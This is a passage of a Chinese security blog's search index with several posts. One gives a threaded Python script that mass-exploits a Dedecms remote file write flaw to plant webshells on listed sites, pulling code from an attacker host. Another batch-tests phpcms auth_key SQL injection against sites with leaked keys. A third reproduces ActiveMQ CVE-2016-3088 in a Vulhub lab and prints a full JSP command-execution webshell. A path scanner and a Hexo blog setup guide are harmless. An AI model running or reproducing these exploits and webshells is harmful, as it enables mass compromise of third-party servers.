      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>Dedecms远程文件写入漏洞。出现于/install/index.php.bak这个文件<br>详细情况请看：<a href="http://www.k2a.cn/131.html" target="_blank" rel="noopener">http://www.k2a.cn/131.html</a></p><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=1906298132,553206994&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路：</strong></p><pre><code>1.先发送请求 /install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php 进行清空2.构造shell进行写入请求3.验证shell是否存在</code></pre><p>一开始我直接判断是否防火墙之类的东西，导致后面没有办法成功。所以<br>我这里就没有些判断什么防火墙的东西。直接判断shell有没有写入成功</p><p>代码：</p><pre><code>import requestsimport osimport threadingpayload=[&#39;/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xx.php&amp;updateHost=http://your-IP/&#39;,&#39;/data/xx.php&#39;,&#39;shell的特征&#39;]user=input(&#39;file:&#39;)if os.path.exists(user): //判断文件是否存在    print(&#39;[+]open {} ok !&#39;.format(user))else:    print(&#39;[-]Not found {}&#39;.format(user))    exit()def explot(urls):    headers = {&#39;user-agent&#39;: &#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#39;}    url1=&quot;{}&quot;.format(urls+payload[0]).strip() //构造URL     url2=&quot;{}&quot;.format(urls+payload[1]).strip()    gjz=payload[2]    try:        rw=requests.get(url=&#39;{}/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php &#39;.format(urls),headers=headers) //发送请求进行清空        rqt=requests.get(url=url1,headers=headers)  //远程写入        rqt2=requests.get(url=url2,headers=headers)         if gjz in rqt2.text or gjz in rqt2.content.decode(&#39;utf-8&#39;): //判断是否成功写入shell            print(&#39;[+]shell url:{}&#39;.format(rqt2.url)            print(&#39;[+]shell url:{}&#39;.format(rqt2.url),file=open(&#39;good.txt&#39;,&#39;a&#39;))        else:            print(&#39;[-]no shell {}&#39;.format(rqt2.url))    except:        passif __name__ == &#39;__main__&#39;:    dk=open(&#39;{}&#39;.format(user),&#39;r&#39;)    for r in dk.readlines():        qc=&quot;&quot;.join(r.split(&#39;\n&#39;))        t=threading.Thread(target=explot,args=(qc,))        t.start()</code></pre><p>测试结果:<br><img src="https://i.imgur.com/qvZeGSc.png" alt=""></p><p><img src="https://i.imgur.com/f3AJ3tb.png" alt=""></p><p>转载请注明：出自422926799.Github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpcmssqllin</title>
      <link href="/posts/d74d279d.html"/>
      <url>/posts/d74d279d.html</url>
      <content type="html"><![CDATA[<h1 id="phpcms-auth-key注入漏洞批量检测"><a href="#phpcms-auth-key注入漏洞批量检测" class="headerlink" title="phpcms auth_key注入漏洞批量检测"></a>phpcms auth_key注入漏洞批量检测</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>一位基友问我能不能写批检，然后就写了。这个漏洞主要是因为auth_key泄露造成的sql注入漏洞。中专检测的php网上已经有了<br>我们只需要写个批量检测就行了。</p><p><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2127804709,2109998066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><pre><code>1.首先你得了解这个漏洞为什么会发生？我该怎么去利用？详细请看这篇文章：https://www.waitalone.cn/phpcmsv9-authkey-sql.html2.居然已经给出了PHP的中专检测脚本，我们只需要批量替换掉php检测脚本的URL和key。然后生成新的修改好的PHP文件放入一个目录即可3.然后把生成的目录放入你的PHP环境，进行读取该路径下的所有PHP文件名。然后发送请求判断返回结果是0还是-1即可。（0代表无漏洞，-1代表有漏洞）</code></pre><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>jsqllin.py</p><pre><code>import requestsimport osimport rekeys=[]#if os.path.exists(&#39;v9.php&#39;): #   print(&#39;[+]ok v9.php&#39;)##  print(&#39;[-]not found v9.php&#39;)  #  exit()xs=open(&#39;saveurl.txt&#39;,&#39;w&#39;)xs.close()print(&#39;[+]Write url&#39;)dw=open(&#39;phpv9_key_leak.txt&#39;,&#39;r&#39;)for j in dw.readlines():    ldw=&quot;&quot;.join(j.split(&#39;\n&#39;))    qe = re.finditer(&#39;(http|https)://(www.)?(\w+(\.)?)+&#39;, ldw) //正则提取出URL    for q in qe:        rc = re.findall(&quot;[a-zA-z]+://[^\s]*&quot;, str(q))        for j in rc:            we = &quot;{}&quot;.format(j).replace(&#39;&gt;&#39;, &#39;&#39;).replace(&quot;&#39;&quot;, &#39;&#39;)            print(we,file=open(&#39;saveurl.txt&#39;,&#39;a&#39;))wc=[]lo=open(&#39;keys.txt&#39;,&#39;w&#39;)lo.close()dkv=open(&#39;phpv9_key_leak.txt&#39;,&#39;r&#39;)for r in dkv.readlines():    wq=&quot;&quot;.join(r.split(&#39;\n&#39;))    qe=re.sub(&#39;(http|https)://(www.)?(\w+(\.)?)+&#39;,&#39;&#39;,wq)    qc=re.sub(&#39;\|&#39;,&#39;&#39;,str(qe))    tx=re.findall(&#39;[a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9][a-z-A-Z-0-9]&#39;,str(qc)) //正则提取出key    for k in tx:        print(k,file=open(&#39;keys.txt&#39;,&#39;a&#39;))pds2=[]wqe2=[]pds=open(&#39;saveurl.txt&#39;,&#39;r&#39;)wqe=open(&#39;keys.txt&#39;,&#39;r&#39;)for b in pds.readlines():    pds2.append(&quot;&quot;.join(b.split(&#39;\n&#39;)))for w in wqe.readlines():    wqe2.append(&quot;&quot;.join(w.split(&#39;\n&#39;)))for x in range(int(len(pds2))): //读取pds（key列表里面的长度）生成对应数量的PHP文件    os.mknod(&#39;scv/{}v9.php&#39;.format(x))dr=os.listdir(&#39;scv&#39;) //读取scv目录下所有的PHP文件for d in range(0,len(pds2)):    print(&quot;&quot;&quot;&lt;?phpset_time_limit(0);$wang_url = &#39;{}&#39;; &quot;&quot;&quot;.format(pds2[d])+&quot;&quot;&quot; $auth_key = &#39;{}&#39;;&quot;&quot;&quot;.format(wqe2[d])+&quot;&quot;&quot; $str = &quot;uid=1&quot; . stripslashes($_GET[&#39;id&#39;]);$encode = sys_auth($str, &#39;ENCODE&#39;, $auth_key);$content = file_get_contents($wang_url . &quot;/phpsso_server/?m=phpsso&amp;c=index&amp;a=getuserinfo&amp;appid=1&amp;data=&quot; . $encode);echo $content;function sys_auth($string, $operation = &#39;ENCODE&#39;, $key = &#39;&#39;, $expiry = 0){    $key_length = 4;    $key = md5($key);    $fixedkey = hash(&#39;md5&#39;, $key);    $egiskeys = md5(substr($fixedkey, 16, 16));    $runtokey = $key_length ? ($operation == &#39;ENCODE&#39; ? substr(hash(&#39;md5&#39;, microtime(true)), -$key_length) : substr($string, 0, $key_length)) : &#39;&#39;;    $keys = hash(&#39;md5&#39;, substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));    $string = $operation == &#39;ENCODE&#39; ? sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0) . substr(md5($string . $egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));    $i = 0;    $result = &#39;&#39;;    $string_length = strlen($string);    for ($i = 0; $i &lt; $string_length; $i++) {        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));    }    if ($operation == &#39;ENCODE&#39;) {        return $runtokey . str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));    } else {        if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $egiskeys), 0, 16)) {            return substr($result, 26);        } else {            return &#39;&#39;;        }    }}?&gt;    &quot;&quot;&quot;,file=open(&#39;scv/{}&#39;.format(dr[d]),&#39;a&#39;)) //这个公司会将修改好的逐个写入</code></pre><p>jiances.py</p><pre><code>import requestsimport osprint(&#39;[!]请确保你把生成的php文件夹拷贝到你的php环境目录之下，然后请输入目录的路径。我将获取路径下所有的文件进行检测&#39;)user=input(&#39;path:&#39;)xj=open(&#39;save.txt&#39;,&#39;w&#39;)xj.close()def exploitsqllin():    cs=os.listdir(user) //读取指定列表下的所有文件    headers={&#39;user-gent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#39;}    for s in cs: //遍历        print(s,file=open(&#39;save.txt&#39;,&#39;a&#39;)) //写入txt    dk=open(&#39;save.txt&#39;,&#39;r&#39;)     for r in dk.readlines():        wed=&quot;&quot;.join(r.split(&#39;\n&#39;))        urls=&#39;http://127.0.0.1/scv/{}?id=1&#39;.format(wed) //遍历txt之后构造URL        rq=requests.get(url=urls,headers=headers) //发送请求进行判断        if &#39;0&#39; in rq.text:             print(&#39;[-]Not bug {}&#39;.format(rq.url))        elif &#39;-1&#39; in rq.text:            print(&#39;[+]Bug url {}&#39;.format(rq.url))exploitsqllin()</code></pre><p>图片：</p><p>生成的php<br><img src="https://i.imgur.com/bP9cbAG.png" alt=""></p><p><img src="https://i.imgur.com/9490Rej.png" alt=""></p><p>检测结果：<br><img src="https://i.imgur.com/2EyNcfM.png" alt=""></p><p><img src="https://i.imgur.com/939Jan6.png" alt=""></p><p>漏洞几率不是很大</p><pre><code>[-]Not bug http://127.0.0.1/scv/79v9.php?id=1[-]Not bug http://127.0.0.1/scv/66v9.php?id=1[-]Not bug http://127.0.0.1/scv/2v9.php?id=1[+]Bug url http://127.0.0.1/scv/45v9.php?id=1[-]Not bug http://127.0.0.1/scv/47v9.php?id=1[-]Not bug http://127.0.0.1/scv/74v9.php?id=1[-]Not bug http://127.0.0.1/scv/91v9.php?id=1[-]Not bug http://127.0.0.1/scv/90v9.php?id=1[-]Not bug http://127.0.0.1/scv/88v9.php?id=1[-]Not bug http://127.0.0.1/scv/57v9.php?id=1[+]Bug url http://127.0.0.1/scv/89v9.php?id=1[-]Not bug http://127.0.0.1/scv/78v9.php?id=1[-]Not bug http://127.0.0.1/scv/14v9.php?id=1[-]Not bug http://127.0.0.1/scv/5v9.php?id=1[-]Not bug http://127.0.0.1/scv/15v9.php?id=1[-]Not bug http://127.0.0.1/scv/63v9.php?id=1[-]Not bug http://127.0.0.1/scv/76v9.php?id=1[-]Not bug http://127.0.0.1/scv/87v9.php?id=1[+]Bug url http://127.0.0.1/scv/26v9.php?id=1[-]Not bug http://127.0.0.1/scv/72v9.php?id=1[+]Bug url http://127.0.0.1/scv/43v9.php?id=1[-]Not bug http://127.0.0.1/scv/84v9.php?id=1[-]Not bug http://127.0.0.1/scv/25v9.php?id=1[+]Bug url http://127.0.0.1/scv/92v9.php?id=1[-]Not bug http://127.0.0.1/scv/13v9.php?id=1[-]Not bug http://127.0.0.1/scv/71v9.php?id=1[-]Not bug http://127.0.0.1/scv/75v9.php?id=1[-]Not bug http://127.0.0.1/scv/56v9.php?id=1[-]Not bug http://127.0.0.1/scv/19v9.php?id=1[+]Bug url http://127.0.0.1/scv/50v9.php?id=1[-]Not bug http://127.0.0.1/scv/31v9.php?id=1[-]Not bug http://127.0.0.1/scv/41v9.php?id=1[-]Not bug http://127.0.0.1/scv/53v9.php?id=1[-]Not bug http://127.0.0.1/scv/37v9.php?id=1[-]Not bug http://127.0.0.1/scv/44v9.php?id=1[-]Not bug http://127.0.0.1/scv/85v9.php?id=1[-]Not bug http://127.0.0.1/scv/42v9.php?id=1[+]Bug url http://127.0.0.1/scv/52v9.php?id=1[+]Bug url http://127.0.0.1/scv/17v9.php?id=1[-]Not bug http://127.0.0.1/scv/64v9.php?id=1[-]Not bug http://127.0.0.1/scv/80v9.php?id=1[-]Not bug http://127.0.0.1/scv/3v9.php?id=1[-]Not bug http://127.0.0.1/scv/4v9.php?id=1[-]Not bug http://127.0.0.1/scv/58v9.php?id=1[-]Not bug http://127.0.0.1/scv/68v9.php?id=1[-]Not bug http://127.0.0.1/scv/48v9.php?id=1[-]Not bug http://127.0.0.1/scv/20v9.php?id=1[+]Bug url http://127.0.0.1/scv/38v9.php?id=1[-]Not bug http://127.0.0.1/scv/62v9.php?id=1[-]Not bug http://127.0.0.1/scv/29v9.php?id=1[-]Not bug http://127.0.0.1/scv/24v9.php?id=1[-]Not bug http://127.0.0.1/scv/32v9.php?id=1[-]Not bug http://127.0.0.1/scv/61v9.php?id=1[-]Not bug http://127.0.0.1/scv/86v9.php?id=1[-]Not bug http://127.0.0.1/scv/46v9.php?id=1[-]Not bug http://127.0.0.1/scv/33v9.php?id=1[-]Not bug http://127.0.0.1/scv/39v9.php?id=1[-]Not bug http://127.0.0.1/scv/1v9.php?id=1[-]Not bug http://127.0.0.1/scv/51v9.php?id=1[-]Not bug http://127.0.0.1/scv/93v9.php?id=1[-]Not bug http://127.0.0.1/scv/36v9.php?id=1[-]Not bug http://127.0.0.1/scv/81v9.php?id=1[-]Not bug http://127.0.0.1/scv/83v9.php?id=1[-]Not bug http://127.0.0.1/scv/27v9.php?id=1[-]Not bug http://127.0.0.1/scv/55v9.php?id=1[-]Not bug http://127.0.0.1/scv/23v9.php?id=1[-]Not bug http://127.0.0.1/scv/12v9.php?id=1[-]Not bug http://127.0.0.1/scv/95v9.php?id=1[-]Not bug http://127.0.0.1/scv/40v9.php?id=1[-]Not bug http://127.0.0.1/scv/0v9.php?id=1[-]Not bug http://127.0.0.1/scv/77v9.php?id=1[-]Not bug http://127.0.0.1/scv/35v9.php?id=1[-]Not bug http://127.0.0.1/scv/73v9.php?id=1[-]Not bug http://127.0.0.1/scv/21v9.php?id=1[-]Not bug http://127.0.0.1/scv/18v9.php?id=1[-]Not bug http://127.0.0.1/scv/65v9.php?id=1[-]Not bug http://127.0.0.1/scv/16v9.php?id=1[-]Not bug http://127.0.0.1/scv/34v9.php?id=1[-]Not bug http://127.0.0.1/scv/59v9.php?id=1[+]Bug url http://127.0.0.1/scv/94v9.php?id=1[-]Not bug http://127.0.0.1/scv/10v9.php?id=1[-]Not bug http://127.0.0.1/scv/22v9.php?id=1</code></pre><p>转载请声明：来之九世的博客</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python扫描web路径小工具</title>
      <link href="/posts/8a2431fe.html"/>
      <url>/posts/8a2431fe.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>今天逛朋友圈的时候。发现了车王说，用python写web路径扫描的小伙伴门用head别用get。<br>后来我去百度了查了一下发现Head和Get的不同之处。所以有了以下这篇文章。<br></p><h1 id="请求对比："><a href="#请求对比：" class="headerlink" title="请求对比："></a>请求对比：</h1><p>GET：使用GET请求某个路径获取返回的响应。请求参数会暴露在外<br><br>HEAD：特别适用在优先的速度和带宽下 <br><br>1.检查资源的有效性。 <br><br>2.检查超链接的有效性。 <br><br>3.检查网页是否被串改。 <br><br>4.多用于自动搜索机器人获取网页的标志信息，获取rss种子信息，或者传递安全认证信息等。 <br><br><img src="https://i.imgur.com/EM4AYjv.png" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>思路：让使用者可以调用指定的web字典进行扫描，添加过滤信息。<br>当返回的URL的状态码为200并且无过滤列表里面关键字则判定为存在该路径。</p><p><strong>代码：</strong></p><pre><code>import requestsimport osurlw=[]okurl=[]noturl=[]error=[&#39;404&#39;,&#39;Not Found&#39;,&#39;403&#39;,&#39;找不到&#39;,&#39;没有权限&#39;,&#39;360&#39;,&#39;云锁&#39;,&#39;网站防火墙&#39;,&#39;D盾&#39;,&#39;百度云加速&#39;] //过滤列表headers={&#39;user-agent&#39;:&#39;Opera/9.80(WindowsNT6.1;U;en)Presto/2.8.131Version/11.11&#39;}ld=os.listdir(&#39;dict&#39;)print(&#39;[+]Discovery directory&#39;)for l in ld:    print(&#39;[+]find&#39;,l)print(&#39;&#39;)user=input(&#39;Please choose:&#39;)user2=input(&#39;Enter your URL:&#39;)if os.path.exists(&#39;dict/{}&#39;.format(user)):    print(&#39;[+]File existence {}&#39;.format(user))else:    print(&#39;[-]file does not exist {}&#39;.format(user))    exit()ope=open(&#39;dict/{}&#39;.format(user),&#39;r&#39;)for r in ope.readlines():    url=user2.strip()+&quot;&quot;.join(r.split(&#39;\n&#39;))    urlw.append(url)def ether(urls):    try:        reqt=requests.head(url=urls,headers=headers,allow_redirects=True)        for e in error:            if reqt.status_code==200 and e not in reqt.text: //判断                yes=&#39;[200]=&gt;Discovery path:{}&#39;.format(reqt.url)                if yes in okurl:continue //去重                okurl.append(yes)                print(yes)            else:                no=&#39;[{}]=&gt;Can t find:{}&#39;.format(reqt.status_code,reqt.url)                if no in noturl:continue //去重                noturl.append(no)                print(no)    except Exception as g:        print(&#39;[-]Error in {} url:{}&#39;.format(g,reqt.url))for w in urlw:    ether(w)</code></pre><p><strong>测试效果：</strong><br><img src="https://i.imgur.com/eAIMARt.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</title>
      <link href="/posts/55a9538c.html"/>
      <url>/posts/55a9538c.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>学习完Rust的Vector，想着复现一下Vulhub里面的漏洞。然后就踩到了一个坑了。= =简直MMP，原本是想着写CVE-2015-5254的复现的。可复现方法不能用了。所以emmmm….<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=886494489,586744998&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p>首先我们要搭建Vulhub的环境：</p><pre><code>Vulhub漏靶场搭建方法：vulhub官网：http://vulhub.org/#/docs/download-vulhub/1.安装docker，windows自己去官网下。Linux执行：sudo apt-get install docker.io2.安装python和pip:sudo apt-get install python和suao apt-get install python-pip3.安装docker-compose:pip install docker-compose4.下载Vulhub：git clone https://github.com/vulhub/vulhub.git安装好之后进入对应的漏洞文件执行：docker-compose up -d如果出现：Couldn&#39;t connect to Docker daemon at http+xxx的问题有三个解决的方法：1.将当前的用户加入dokcer用户组 sudo usermod -aG docker &lt;Username&gt;2.在使用docker-compose附加上sudo sudo docker-compose up -d3.设置DOCKER_HOST这一个环境变量 export DOCKER_HOST=tcp://loaclhost:4243 设置完成后重新启动docker</code></pre><p>漏洞介绍：</p><pre><code>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高文件操作容易出现漏洞所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</code></pre><p>在测试过程中，可以关注ActiveMQ的版本，避免走弯路。</p><p>这里我的是CVE-2016-3088,所以我们要进入对应的目录：</p><pre><code>cd /vulhub/activemq/CVE-2016-3088 </code></pre><p><img src="https://i.imgur.com/VZ5imMu.png" alt=""></p><pre><code>然后执行docker-compose -build 下载漏洞环境然后在执行docker-compose up -d 启动</code></pre><p>之后我们打开浏览器访问：</p><pre><code>http://127.0.0.1:8161</code></pre><p>我们可以看到如下图所示：</p><p><img src="https://i.imgur.com/uoF1A1z.png" alt=""></p><p>这个任意文件写入漏洞得要先知道WEB路径。所以我们得登陆后台<br>默认用户名和密码是：admin/admin，登陆进去后我们要访问</p><pre><code>http://your-ip:8161/admin/test/systemProperties.jsp</code></pre><p>查看ActiveMQ的绝对路径</p><p><img src="https://i.imgur.com/LpIcgNx.png" alt=""></p><p>绝对路径为：</p><pre><code>/opt/activemq</code></pre><p>知道绝对路径之后，我们要进行文件上传。<br><img src="https://i.imgur.com/MyFt8se.png" alt=""></p><p>注：这里的shell2.txt为shell代码<br>shell代码如下：</p><pre><code>&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% %&gt; &lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;comments&quot; ACTION=&quot;&quot;&gt;&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;comment&quot;&gt; &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if ( request.getParameter( &quot;comment&quot; ) != null ) {     out.println( &quot;Command: &quot; + request.getParameter( &quot;comment&quot; ) + &quot;&lt;BR&gt;&quot; );     Process p        = Runtime.getRuntime().exec( request.getParameter( &quot;comment&quot; ) );     OutputStream os    = p.getOutputStream();     InputStream in        = p.getInputStream();     DataInputStream dis    = new DataInputStream( in );     String disr        = dis.readLine();     while ( disr != null )     {         out.println( disr ); disr = dis.readLine();     } } %&gt; &lt;/pre&gt;  &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>代码来自：<a href="https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp" title="JSP shell" target="_blank" rel="noopener">https://github.com/JoyChou93/webshell/blob/master/jsp/cmd.jsp</a></p><p>上传：<br><img src="https://i.imgur.com/dSa5cgB.png" alt=""></p><p>HTTP状态码为204，即为上传成功</p><p>然后听过MOVE进行改名为jsp<br><img src="https://i.imgur.com/YdINGV6.png" alt=""></p><p>然后我们访问<a href="http://127.0.0.1:8161/api,就可以看到我们上传的shell文件" target="_blank" rel="noopener">http://127.0.0.1:8161/api,就可以看到我们上传的shell文件</a></p><p><img src="https://i.imgur.com/asEAY27.png" alt=""></p><p>执行命令如下：<br><img src="https://i.imgur.com/AI0RAO3.png" alt=""></p><p>ActiveMQ更多漏洞：<a href="http://www.freebuf.com/column/161188.html" title="更多漏洞" target="_blank" rel="noopener">http://www.freebuf.com/column/161188.html</a></p><p>转载请声明：来之422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>用Github+Hexo搭建一个属于自己的博客</title>
      <link href="/posts/5358472d.html"/>
      <url>/posts/5358472d.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>在博客园写的博文和别人用github+hexo搭建起来的对比。感觉别人的好高大上= =，然后昨天晚上黑哥也在搞看的我也想搞。就有了以下的故事<br>虽然之前按照车王的方法失败了一次，但是还是死心不改在试一次，后面成功了。<br><br>我的环境：OS:Ubuntu<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=257909425,2915417066&amp;fm=27&amp;gp=0.jpg" alt=""></p><h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><hr><p>首先你得拥有一个属于你的Github账号，如果没有就去注册<br><br>Github官网：<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p><p>注册好之后，去新建一个项目。为<username>github.io,必须是你的username。否则会有很多的麻烦<br></username></p><p><img src="https://i.imgur.com/LkZquwd.png" alt=""></p><p>然后你在你电脑里面安装Git,nodejs,hexo,npm<br></p><ol><li>windows安装Git：<a href="https://git-scm.com/" target="_blank" rel="noopener">https://git-scm.com/</a> Git官网自行下载安装<br></li><li>Linux下安装： sudo apt-get install git<br></li><li>windows安装nodejs：<a href="https://www.cnblogs.com/hackyo/p/8110951.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackyo/p/8110951.html</a> //安装nodejs教程和npm教程<br></li><li>Linux下安装nodejs：<a href="https://blog.csdn.net/u014361775/article/details/78865582" target="_blank" rel="noopener">https://blog.csdn.net/u014361775/article/details/78865582</a> //安装nodejs和npm教程<br></li><li>安装hexo：npm i -g hexo<br></li><li>查看hexo是否安装成功：hexo -v<br></li><li>hexo初始化：hexo init<br><br>初始化之后你的目录下会出现以下文件夹：<br><br><img src="https://i.imgur.com/YsKwGqW.png" alt=""><br>node_modules：是依赖包<br><br>public：存放的是生成的页面<br><br>scaffolds：命令生成文章等的模板<br><br>source：用命令创建的各种文章<br><br>themes：主题<br><br>_config.yml：整个博客的配置<br><br>db.json：source解析所得到的<br><br>package.json：项目所需模块项目的配置信息<br></li></ol><p>干好之后就开始配置你的hexo了，打开_config.yml配置文件,进行更改。<br><br><img src="https://i.imgur.com/37KDIEA.png" alt=""><br>然后下载你喜欢的模板进行替换，模板在hexo官网自己挑选下载到themes里面。修改根目录下的_config.yml找到themes进行模板替换<br><br>替换完之后预览一下效果。<br><br>hexo clean<br><br>hexo generate<br><br>hexo server<br><br>打开浏览器访问：<a href="http://127.0.0.1:4000" target="_blank" rel="noopener">http://127.0.0.1:4000</a><br><br>我这里的主题是仙人掌大法<br><br><img src="https://i.imgur.com/i3Fumv1.png" alt=""><br>做好这些以后，你得创建ssh<br><br>在gitbash中输入：ssh-keygen -t rsa -C “<a href="mailto:youremail@example.com" target="_blank" rel="noopener">youremail@example.com</a>，生成ssh。然后按下图的方式找到id_rsa.pub文件的内容。<br><br>然后去github找到setting添加ssh key。<br><br><img src="https://i.imgur.com/tNcZBqg.png" alt=""><br>在gitbash中验证是否添加成功：ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a><br><br>完成下一步你就成功啦！<br><br>安装deploy<br><br>npm install hexo-deployer-git –save<br><br>安装之后，去修改你的_config.yml下的deploy。<br>类似于这样子的：<br></p><pre><code>deploy:      type:git    repository:git@github.com:422926799/422926799.github.io.git    branch:master</code></pre><p>弄好之后执行：hexo d -g 即可部署你的博客。访问<a href="https://xxx.github.io就能看到了。" target="_blank" rel="noopener">https://xxx.github.io就能看到了。</a><br>hexo的基本命令：</p><pre><code>hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo p == hexo publishhexo g == hexo generate#生成hexo s == hexo server #启动服务预览hexo d == hexo deploy#部署hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存 网页正常情况下可以忽略此条命令hexo g #生成静态网页hexo d #开始部署hexo new &quot;postName&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo generate #生成静态页面至public目录hexo server #开启预览访问端口（默认端口4000，&#39;ctrl + c&#39;关闭server）hexo deploy #将.deploy目录部署到GitHubhexo new [layout] &lt;title&gt;hexo new photo &quot;My Gallery&quot;hexo new &quot;Hello World&quot; --lang tw</code></pre><p><strong><br>转载请注明：来只422926799.github.io。</strong></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
